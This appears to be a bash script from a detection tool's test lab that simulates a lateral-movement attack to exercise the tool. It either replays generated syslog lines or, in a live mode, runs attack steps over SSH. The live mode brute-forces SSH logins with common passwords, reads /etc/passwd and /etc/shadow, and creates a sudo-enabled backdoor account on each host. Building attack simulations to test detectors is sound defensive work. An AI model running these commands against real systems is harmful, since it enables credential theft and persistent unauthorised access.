#!/usr/bin/env bash
# lateral_movement.sh - drive a multi-stage internal (lateral movement) attack
# against ACT, either as a safe replay or for real against a lab you control.
#
#   MODE 1 (default) - replay:
#       Generates the syslog stream from lateral_movement.py and appends it to a
#       log file that ACT tails. No network traffic, safe anywhere.
#
#           ./lateral_movement.sh --replay /var/log/act_lab.log
#
#   MODE 2 - live, against your OWN lab VMs:
#       Actually SSH-hops WEB -> DB -> APP, escalates and persists on each. Only
#       run this against machines you are authorised to test. Needs sshpass.
#
#           ./lateral_movement.sh --live \
#               --web deploy@10.0.5.11 --web-pass 'p1' \
#               --db  dbadmin@10.0.5.20 --db-pass 'p2' \
#               --app svc@10.0.5.30   --app-pass 'p3'
#
# Point ACT at the target(s) first (dashboard "Go live" / "Pull 1h", or
# POST /api/live/start), then run this and watch the attack paths appear.

set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

MODE="replay"
REPLAY_TARGET=""
WEB="" WEB_PASS="" DB="" DB_PASS="" APP="" APP_PASS=""
DELAY="${ACT_ATTACK_DELAY:-1}"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --replay) MODE="replay"; REPLAY_TARGET="${2:-}"; shift 2;;
    --live)   MODE="live"; shift;;
    --web)    WEB="$2"; shift 2;;
    --web-pass) WEB_PASS="$2"; shift 2;;
    --db)     DB="$2"; shift 2;;
    --db-pass) DB_PASS="$2"; shift 2;;
    --app)    APP="$2"; shift 2;;
    --app-pass) APP_PASS="$2"; shift 2;;
    -h|--help) sed -n '2,32p' "$0"; exit 0;;
    *) echo "unknown option: $1" >&2; exit 2;;
  esac
done

log() { printf '\033[36m[lateral]\033[0m %s\n' "$*"; }

# --------------------------------------------------------------------------- #
if [[ "$MODE" == "replay" ]]; then
  : "${REPLAY_TARGET:?--replay needs a path, e.g. --replay /var/log/act_lab.log}"
  log "generating internal-attack syslog -> $REPLAY_TARGET"
  python3 "$HERE/lateral_movement.py" --start now >> "$REPLAY_TARGET"
  log "done. 36 lines appended. ACT should now show ~3 attack paths."
  exit 0
fi

# --------------------------------------------------------------------------- #
# live mode
command -v sshpass >/dev/null || { echo "need sshpass for --live (apt install sshpass)"; exit 1; }
: "${WEB:?--web user@host required}" ; : "${DB:?--db user@host required}" ; : "${APP:?--app user@host required}"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6"
run() { local pass="$1" dest="$2" cmd="$3"; sshpass -p "$pass" ssh $SSH_OPTS "$dest" "$cmd" || true; }
brute() {  # brute($pass_list, $dest) - a few bad guesses then the real login
  local dest="$1"; shift
  for bad in "$@"; do
    sshpass -p "$bad" ssh $SSH_OPTS -o NumberOfPasswordPrompts=1 "$dest" true 2>/dev/null || true
    sleep "$DELAY"
  done
}

log "hop 0: brute forcing $WEB"
brute "$WEB" wrongpw admin123 letmein password1 toor
log "hop 0: logging in to web tier and doing recon + failed sudo"
run "$WEB_PASS" "$WEB" "id; uname -a; sudo -k; echo wrong | sudo -S cat /etc/passwd 2>/dev/null | head -3"
sleep "$DELAY"

log "hop 1: web -> db, brute forcing $DB"
brute "$DB" wrongpw dbpass changeme postgres admin
log "hop 1: on the db tier - failed sudo, read /etc/shadow, create a backdoor account"
run "$DB_PASS" "$DB" "sudo -k; echo wrong | sudo -S cat /etc/shadow 2>/dev/null | head -2; \
  sudo cat /etc/shadow >/dev/null 2>&1; \
  sudo useradd -m -s /bin/bash svc-monitor 2>/dev/null; sudo usermod -aG sudo svc-monitor 2>/dev/null"
sleep "$DELAY"

log "hop 2: db -> app, brute forcing $APP"
brute "$APP" wrongpw apppass svc123 secret admin
run "$APP_PASS" "$APP" "id; hostname"

log "done. Check ACT: separate attack paths for each pivoted host, most compromised."
